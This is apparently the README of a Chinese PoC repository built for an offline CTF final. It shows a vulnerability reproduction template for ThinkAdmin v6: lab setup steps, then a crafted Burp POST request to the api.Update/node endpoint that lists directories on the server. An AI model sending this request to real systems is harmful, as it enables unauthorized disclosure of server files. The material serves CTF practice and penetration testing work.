# poc-hub
此项目源于要参加一场线下的CTF决赛，由于断网，故需要大量本地poc，考虑到也可为日后的渗透测试工作提供便利  
当前仓库没有漏洞分析只有POC

漏洞复现模板如下：
```
# 0x00 软件介绍
基于ThinkPHP，专注于微信领域后台管理的一款开发框架

# 0x01 复现环境
使用环境：本地搭建的环境  
复现版本：2020.08.03.1之前的某一个v6版本：https://github.com/179776823/ThinkAdmin

# 0x02 环境搭建
目标环境：2008_r2_standard_zh-chs + phpstudy + https://github.com/179776823/ThinkAdmin

composer config -g repo.packagist composer https://mirrors.aliyun.com/composer#使用阿里云的源更快一些  
https://github.com/179776823/ThinkAdmin#下载有漏洞的v6版本到phpstudy的对应目录下  
cd ThinkAdmin  
composer install  
create database admin_v6;  
create user 'admin_v6'@'localhost' identified by 'FbYBHcWKr2';#用户名密码来自config\database.php  
grant all on admin_v6.* to 'admin_v6'@'localhost';  
use admin_v6;  
source C:\phpstudy_pro\WWW\ThinkAdmin-6\admin_v6.sql;#将数据导入数据库  
访问：http://127.0.0.1:81/ThinkAdmin-6/public/index.php  
参考链接：  
https://mp.weixin.qq.com/s/MjU6u_eTsdH-nwQAgbxLRw  
https://thinkadmin.top/install  
https://www.cnblogs.com/Dot-Boy/archive/2008/08/04/1260185.html  
https://www.jianshu.com/p/d7b9c468f20d  
https://github.com/xuxuedong/personal-note/tree/master/2020_10_18_%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%BB%8E%E5%A4%B4%E8%AE%B0%E5%BD%95

# 0x03 利用条件
无

# 0x04 影响版本
作者原话：2020.08.03.01，≤这个版本的都有可能存在漏洞  
参考链接：  
https://github.com/zoujingli/ThinkAdmin/issues/244

# 0x05 漏洞复现
攻击环境：Kali-Linux-2020.2-vmware-amd64 + Burp_Suite_Pro_v2020.5.1

访问：http://192.168.149.133:81/ThinkAdmin-6/public/index.php/admin/login.html  
burp抓包，将数据包修改如下：  
'''
POST /ThinkAdmin-6/public/index.php/admin/login.html?s=admin/api.Update/node HTTP/1.1
Host: 127.0.0.1
Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

rules=%5B%22.%2F%22%5D
'''
成功列出了目录，如下图  
![image](./0.png)

# 0x06 踩坑记录
无

# 0x07 参考链接
无
```
